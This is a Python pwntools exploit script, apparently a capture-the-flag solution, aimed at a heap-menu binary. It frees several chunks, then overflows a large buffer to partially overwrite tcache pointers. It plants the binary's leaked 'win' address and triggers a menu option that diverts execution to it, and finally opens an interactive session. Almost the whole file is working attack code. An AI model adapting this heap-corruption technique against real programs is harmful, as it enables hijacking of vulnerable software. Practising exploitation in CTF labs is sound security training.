#!/usr/bin/python3

from pwn import *

exe = ELF('b', checksec=False)
# libc = ELF('-o', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
# GDB()

cnt = 0


def s_cr(sz, buf, detail):
    global cnt
    cnt += 1
    sla(b'Delete', str(2))
    sla(b'Size: ', str(sz))
    sa(b'Buffer: ', buf)
    sa(b'Detail: ', detail)
    return cnt-1, cnt


def cr(sz, pa):
    global cnt
    cnt += 1
    sla(b'Delete', str(1))
    sla(b'Size: ', str(sz))
    sa(b'Buffer: ', pa)
    return cnt-1


def free(idx):
    sla(b'Delete', str(0))
    sla(': ', str(idx))


def edit(idx, pa):
    sla(b'Delete', str(3))
    sla(': ', str(idx))
    sa(b'Buffer: ', pa)


def editP(idx, pa):
    sla(b'Delete', str(4))
    sla(': ', str(idx))
    sa(': ', pa)


p.recvuntil(b'win ')
win = int(p.recvline(keepends=False), 16)
info("win " + hex(win))

a = cr(0x18, b'a')
b = cr(0x18, b'b')
c = cr(0x38, b'c')
d = cr(0x38, b'd')
free(a)
free(b)
free(c)
free(d)

buf, meta_data = s_cr(0x150, b'control tcache metadata', b'metadata')
print(buf, meta_data)
edit(buf, b'a'*0x148 + p16(0x92c0))
editP(buf, p64(win))
edit(buf, b'a'*0x148 + p16(0x90a0))
editP(buf, p16(0x9090))
cr(0x18, b'wan')
cr(0x38, b'wan')
cr(0x38, b'wan\0\0\0\0\0')
sla(b'Delete', str(5))

# edit(meta_data, p64(0x555555558020))
p.interactive()
